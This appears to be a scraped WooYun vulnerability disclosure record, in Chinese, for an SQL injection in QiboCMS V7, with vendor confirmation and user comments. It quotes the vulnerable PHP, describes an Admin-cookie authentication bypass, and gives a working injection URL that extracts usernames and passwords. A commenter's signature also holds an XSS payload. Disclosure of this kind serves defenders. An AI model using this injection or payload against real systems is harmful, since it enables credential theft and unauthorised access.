{"id": 360, "wybug_id": "wooyun-2014-070402", "wybug_title": "齐博cmsV7整站系统sql注入", "wybug_corp": "齐博CMS", "wybug_author": "′king", "wybug_date": "2014-07-31 17:30", "wybug_open_date": "2014-10-29 17:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-04：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向公众公开  简要描述： 应该逻辑有点小错误? 详细说明：  http://down.qibosoft.com/down.php?v=v7刚下载来测试的 发现点问题。\nfunction Add_S($array){\tforeach($array as $key=>$value){\t\tif(!is_array($value)){\t\t\t@eregi(\"['\\\\\\\"&]+\",$key) && die('ERROR KEY!');\t\t\t$value=str_replace(\"&#x\",\"& # x\",$value);\t//过滤一些不安全字符\t\t\t$value=preg_replace(\"/eval/i\",\"eva l\",$value);\t//过滤不安全函数\t\t\t!get_magic_quotes_gpc() && $value=addslashes($value);\t\t\t$array[$key]=$value;\t\t}else{\t\t\t$array[$key]=Add_S($array[$key]); \t\t}\t}\treturn $array;}\n@eregi(\"['\\\\\\\"&]+\",$key) && die('ERROR KEY!');这个对数组中的key并没有过滤得很完善。如果提交[1'][2] 这样的数组 那么进入这个匹配的就会是2  不会被匹配出 退出。__________________________________________________________________inc/label_module.php中\nif($jobs=='show'){\tif(!$_COOKIE[Admin]&&!$web_admin)\t{\t\tshowerr(\"你无权查看\");\t}\t//获取头与尾的标签\tpreg_replace('/\\$label\\[([\\'a-zA-Z0-9\\_]+)\\]/eis',\"label_array_hf('\\\\1')\",read_file(getTpl(\"head\",$head_tpl)));\tpreg_replace('/\\$label\\[([\\'a-zA-Z0-9\\_]+)\\]/eis',\"label_array_hf('\\\\1')\",read_file(getTpl(\"foot\",$foot_tpl)));\t\t//$label_hf为头部的检索数组,检查头部有多少个标签\t\tis_array($label_hf) || $label_hf=array();\tforeach($label_hf AS $key=>$value)\t{\t\t$rs=$db->get_one(\"SELECT * FROM {$pre}label WHERE tag='$key' AND chtype='99'\");\n\nif(!$_COOKIE[Admin]&&!$web_admin)\t{\t\tshowerr(\"你无权查看\");\t}\n我猜他这里是要管理员才有权限查看?但是呢 这里我们完全不需要登录 连会员都不用登录。因为他这里是用的 && 所以只要不满足一个 就不会退出了。这里的$web_admin肯定我们是无法控制的了但是$_COOKIE[Admin] 是我们可以直接控制的那我们就让$_COOKIE[Admin]为1 就不会退出了\n\n被退出了 这里我们无需登录 直接修改一下cookie\n\n修改了一下cookie就不会被退出了。\nforeach($label_hf AS $key=>$value)\t{\t\t$rs=$db->get_one(\"SELECT * FROM {$pre}label WHERE tag='$key' AND chtype='99'\");\t\tif($rs[tag])\n然后直接把数组中的key带入到了查询当中因为数组中的key没有做addslashes 结合上面的绕过 所以造成了注入。http://www.test.com/v7/index.php?jobs=show&label_hf[1' and extractvalue(1,concat(0x5c,(select concat(username,password) from qb_members limit 1)))%23][2]=asd\n\n注入成功 出数据。   漏洞证明：  \n\n   修复方案：  过滤呗。   版权声明：转载请注明来源 ′king@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-01 11:01 厂商回复： 还是那个老问题引起的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-31 17:33 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  前排mark    \n     2014-07-31 17:34 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  快来猜 这路人甲是谁    \n     2014-07-31 17:34 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  @′  雨。 你的小号    \n     2014-07-31 17:38 |    \t\t果冻好吃 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:11        | 大学通知书下来那天，我迫不及待的用四百块...)\t\t \n  @′  雨。 你基友！怕伤害你。    \n     2014-07-31 21:03 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  @′  雨。  雨大神 又开小号？ 有脾气就不要匿名。    \n     2014-10-29 19:48 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @′  雨。 http://wooyun.org/bugs/wooyun-2010-070366你两撞洞了，还是同一天交的，什么个情况？    \n     2014-10-30 10:48 |    \t\tiskit \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 技术交流)\t\t \n  @eregi(\"['\\\\\\\"&]+\",$key) && die('ERROR KEY!'); 这句什么时候跑到if里边取得？？？    \n     2014-10-30 11:56 |    \t\tiskit \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 技术交流)\t\t \n  $label_hf 是怎么用url中的覆盖了的呀，，    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}